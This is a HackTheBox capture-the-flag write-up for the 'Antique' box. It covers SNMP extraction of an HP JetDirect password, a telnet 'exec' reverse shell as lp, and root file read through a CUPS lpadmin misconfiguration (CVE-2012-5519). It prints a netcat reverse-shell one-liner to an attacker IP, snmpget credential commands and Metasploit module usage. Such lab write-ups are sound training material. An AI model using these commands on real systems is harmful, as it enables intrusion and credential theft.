---
title: "Antique"
date: 2021-12-27
type: docs
tags:
  - htb
  - linux
  - easy
  - snmp
  - jetdirect
  - printer
  - cups
  - lpadmin
  - telnet
  - metasploit
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux, **Difficulty:** Easy, **Released:** 2021-12-27, **IP:** `10.10.11.107` → `antique.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Only **telnet (23)**. Banner is *HP JetDirect*, asks for a password. A UDP scan finds **SNMP (161)**.
2. HP JetDirect stores its telnet/web password in a known SNMP OID (`.1.3.6.1.4.1.11.2.3.9.1.1.13.0`). `snmpget` it, decode the hex → `P@ssw0rd@123!!123`.
3. Telnet in with that password → the JetDirect prompt has an **`exec`** command → `exec <reverse shell>` → shell as **`lp`** (user flag).
4. Internal **CUPS 1.6.1** on `:9090`; `lp` is in the **`lpadmin`** group → CUPS `cupsctl` arbitrary file read as root (`post/multi/escalate/cups_root_file_read`) → read `/root/root.txt`.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| JetDirect telnet (from SNMP OID) | `P@ssw0rd@123!!123` |
| `user.txt` | `/home/lp/user.txt`. `16e70d0cfafc13af117f6307b2e9fbdd` |
| `root.txt` | read via the CUPS file-read module |

</div>

---

## Overview

Antique is a "one weird service, one weird group" box. Everything hinges on knowing that **HP JetDirect print servers keep their admin password in a plaintext-ish SNMP OID**. A genuinely old (2000s-era) trick that HTB dusted off. Once you have the printer's telnet shell, its built-in `exec` gives you code execution as `lp`. Root is a **CUPS misconfiguration**: membership of `lpadmin` lets you point CUPS's `ErrorLog`/`PageLog` at any file and then read it back through the web UI, all as root. It's a good box for practising **UDP enumeration** (the whole thing is invisible if you only scan TCP) and for the lesson that *group membership is a privilege*.

Related SNMP boxes: [Monitored](/writeups/hackthebox/linux/medium/monitored/) (SNMP community string leaks creds). Related "unusual service protocol" boxes: [Backdoor](/writeups/hackthebox/linux/easy/backdoor/) (gdbserver), [PC](/writeups/hackthebox/linux/easy/pc/) (gRPC), [Omni](/writeups/hackthebox/windows/easy/omni/) (SIREP/Windows IoT).

---

## Full Walkthrough

### Recon

```console
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings:
|   NULL:
|_    JetDirect
|     Password:
```

`nc 10.129.95.245 23` just prints `HP JetDirect` then `Password:`. Nothing on TCP but telnet, so scan UDP:

```console
❯ sudo nmap -sU -T4 antique.htb
PORT    STATE SERVICE
161/udp open  snmp
```

<div class="callout callout-note">

**Why UDP matters here**

`nmap` default scans are TCP-only. Services like SNMP (161), DNS (53), TFTP (69), IKE (500), SIP (5060) live on UDP and are simply absent from a normal scan. On a box with a single lonely TCP port, a UDP sweep (`nmap -sU --top-ports 100`) is mandatory. SNMP with the default community string `public` is a classic information leak that can expose processes, ARP tables, installed software, network shares, and (on printers) credentials.

</div>

### SNMP → JetDirect password

The HP JetDirect web/telnet password lives at a well-known enterprise OID:

```console
❯ snmpget -v 1 -c public antique.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 ...
```

Those are ASCII hex bytes. Decode:

```bash
python3 -c "print(bytes.fromhex('50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33'.replace(' ','')).decode())"
# P@ssw0rd@123!!123
```

(Reference: <https://www.irongeek.com/i.php?page=security/networkprinterhacking>.)

### Telnet → `exec` → shell as `lp`

```console
❯ telnet antique.htb
HP JetDirect
Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?
...
exec: execute system commands (exec id)
```

<div class="callout callout-note">

**The JetDirect `exec` command**

Real HP JetDirect firmware has no `exec` verb. HTB added it to make the box solvable, but the *shape* is authentic: embedded management shells routinely expose diagnostic commands (`ping`, `traceroute`, `tcpdump`, config file editors) that shell out without sanitising input. `exec` here runs the argument as a system command directly.

</div>

```console
> exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 9001 >/tmp/f
```

```console
(remote) lp@antique:/home/lp$ cat user.txt
16e70d0cfafc13af117f6307b2e9fbdd
```

### Privilege Escalation. CUPS `lpadmin` file read

An internal service is listening on `9090`:

```console
PORT     STATE SERVICE VERSION
9090/tcp open  ipp     CUPS 1.6
|_http-title: Bad Request - CUPS v1.6.1
```

Port-forward it (`socat TCP-LISTEN:9090,fork TCP:127.0.0.1:9090`, or SSH) and check groups. `lp` is in **`lpadmin`**.

<div class="callout callout-note">

**CVE-2012-5519, CUPS `lpadmin` → root file read/write**

The CUPS web/`cupsctl` interface lets members of the `SystemGroup` (here `lpadmin`) change the daemon's configuration, including `ErrorLog` and `PageLog` paths. The daemon runs as **root**, so you set `ErrorLog=/root/root.txt`, trigger a log write, then fetch `http://localhost:631/admin/log/error_log` and read root-owned content. Write is also possible (append to `/etc/sudoers`, cron, an authorized_keys). Metasploit automates the read path.

</div>

```console
msf6 > use post/multi/escalate/cups_root_file_read
msf6 post(...) > set session 1
msf6 post(...) > run

[+] User in lpadmin group, continuing...
[+] cupsctl binary found in $PATH
[*] Found CUPS 1.6.1
[+] File /etc/shadow (0 bytes) saved to .../cups_file_read_...bin
```

`/etc/shadow` came back empty (0 bytes). Likely a race/first-run miss. So point it at the flag instead:

```
set file /root/root.txt
run
```

and read the loot file from `~/.msf4/loot/`.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/lp/user.txt`. `16e70d0cfafc13af117f6307b2e9fbdd` |
| `root.txt` | `/root/root.txt` (via CUPS file read) |

---

## Lessons & Takeaways

- **Scan UDP.** The entire box is unreachable otherwise.
- **Printers are computers.** JetDirect, PJL, IPP and SNMP on MFPs leak credentials, allow config changes, and often bridge network segments. The [PRET](https://github.com/RUB-NDS/PRET) toolkit exists for exactly this.
- **Change default SNMP community strings** and disable SNMP v1/v2c where possible.
- **`lpadmin` (and `docker`, `disk`, `adm`, `shadow`, `lxd`) are root-equivalent groups.** Audit supplementary group membership like you audit sudo.
- **Patch CUPS**. And in 2024 note the separate `cups-browsed` RCE chain (CVE-2024-47176 et al.).

---

## Related Writeups

- **SNMP enumeration / leaks:** [Monitored](/writeups/hackthebox/linux/medium/monitored/)
- **Unusual service protocol → RCE:** [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [PC](/writeups/hackthebox/linux/easy/pc/), [Omni](/writeups/hackthebox/windows/easy/omni/)
- **Root-equivalent group membership:** [Antique](/writeups/hackthebox/linux/easy/antique/) `lpadmin`, see also container-`docker` in [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)
- **Metasploit post-exploitation modules:** [Omni](/writeups/hackthebox/windows/easy/omni/)

## References

- Network printer hacking (Irongeek) <https://www.irongeek.com/i.php?page=security/networkprinterhacking>
- CVE-2012-5519 (CUPS) <https://nvd.nist.gov/vuln/detail/CVE-2012-5519>
- PRET <https://github.com/RUB-NDS/PRET>
